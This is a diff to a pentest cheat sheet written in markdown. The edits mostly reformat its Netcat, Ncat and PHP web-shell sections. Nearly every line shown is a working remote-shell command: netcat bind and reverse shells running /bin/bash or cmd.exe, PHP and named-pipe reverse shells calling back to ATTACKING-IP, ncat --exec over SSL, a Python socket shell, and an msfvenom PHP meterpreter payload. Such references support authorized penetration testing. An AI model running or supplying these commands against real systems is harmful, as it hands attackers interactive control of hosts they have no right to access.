@@ -98,9 +98,9 @@ php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
 ### Netcat
-If there is a firewall running on the target-machine you will not be able to bind a shell to it. But a reverse shell will work.
 
-Bind shell
+**Bind shell**
+
 ```
 #Linux
 nc -vlp 5555 -e /bin/bash
@@ -110,13 +110,17 @@ nc 192.168.1.101 5555
 nc.exe -nlvp 4444 -e cmd.exe
 ```
 
-Reverse shell
+**Reverse shell**
 
 ```
-nc 192.168.1.101 5555 -e /bin/bash
+# Linux
 nc -lvp 5555
+nc 192.168.1.101 5555 -e /bin/bash
 
-nc.exe 10.11.0.191 443 -e cmd.exe 
+# Windows
+nc -lvp 443
+nc.exe 192.168.1.101 443 -e cmd.exe
+
 ```
 
 ```
@@ -132,11 +136,12 @@ rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
 ### Ncat
+
 Ncat is a better and more modern version of netcat. One feature it has that netcat does not have is encryption. If you are on a pentestjob you might not want to communicate unencrypted. 
 
 Bind
 ```
-ncat --exec cmd.exe --allow 192.168.1.101 -vnl 555 --ssl
+ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
 ncat -v 192.168.1.103 5555 --ssl
 ```
 
@@ -178,11 +183,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 
 
-## Web-shells - platform independent
+## Web-shells - Platform Independent
 
 ### PHP
 
-This php-shell is OS-independent. You can use it on both linux and windows.
+This php-shell is OS-independent. You can use it on both Linux and Windows.
 
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.php
